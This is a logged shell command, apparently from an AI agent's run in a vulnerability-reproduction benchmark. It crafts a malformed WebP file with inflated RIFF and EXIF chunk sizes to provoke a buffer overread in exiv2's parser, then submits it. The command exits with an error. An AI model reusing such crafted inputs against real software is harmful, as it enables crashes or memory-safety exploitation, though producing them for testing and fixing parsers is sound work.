Command `cd /workspace/repo-vul/src-vul/exiv2 && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.webp')
# start from issue_1841_poc.webp and truncate after EXIF payload to stress parser
b=bytearray(Path('test/data/issue_1841_poc.webp').read_bytes())
# keep only RIFF header + EXIF chunk, but make chunk size larger than payload to provoke overread in getHeaderOffset loop
# RIFF size at offset 4 set to 0x20 (32) while actual file shorter
b[4:8]=(32).to_bytes(4,'little')
# EXIF chunk size at offset 16 set to 0x20, but payload remains short
b[16:20]=(32).to_bytes(4,'little')
# truncate payload to 24 bytes total
b=b[:24]
p.write_bytes(b)
print(p, len(b), b.hex())
PY
bash submit.sh /workspace/poc.webp /workspace/analysis.json` executed with exit code 127.
